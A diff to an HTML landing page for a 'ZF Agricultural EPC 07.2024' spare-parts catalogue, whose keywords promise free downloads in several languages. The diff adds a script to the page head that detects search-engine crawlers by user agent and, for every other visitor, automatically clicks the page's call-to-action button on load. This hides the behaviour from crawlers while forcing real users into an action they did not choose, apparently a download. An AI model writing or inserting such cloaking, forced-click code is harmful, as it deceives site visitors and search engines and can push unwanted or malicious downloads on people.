@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ZF Agricultural EPC 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="ZF Agricultural EPC 07.2024 provides unlimited access to ZF Friedrichshafen AG's spare parts info for agricultural machinery in multiple languages.">
     <meta name="keywords" content="ZF Agricultural EPC, ZF Agricultural EPC 07.2024, ZF spare parts, ZF Agricultural machinery, ZF Friedrichshafen AG parts, Agricultural machinery parts, ZF parts catalog, ZF EPC update, ZF machinery spare parts, Agricultural machinery repair, ZF parts database, ZF EPC software, ZF Friedrichshafen AG EPC, ZF parts information, Agricultural equipment parts, ZF Agricultural EPC catalogue free download, ZF Agricultural EPC 2024, ZF Agricultural EPC download, ZF Agricultural EPC free download, ZF Agricultural EPC Español, ZF Agricultural EPC Português, Запчасти ZF, Каталог запчастей ZF, ЗФ Агрикультураль запчасти, АПК ZF каталог запчастей, ЗИП сельхозтехника, Сельхозмашины ZF, Запчасти ZF 07.2024, Загрузка каталога запчастей ZF, бесплатная загрузка ZF каталога запчастей, ЗИП ZF каталога запчастей скачать бесплатно, Каталог запчастей ZF на испанском, Каталог запчастей ZF на португальском, ZF Agro EPC, ZF Agro EPC 07.2024, Catálogo de partes ZF Agro 07.2024, Descargar ZF Agro EPC, Descargar gratis catálogo de partes ZF Agro, Catálogo de peças ZF Agro, ZF Agro EPC baixar, Descarregar ZF Agro EPC grátis">
     <style>
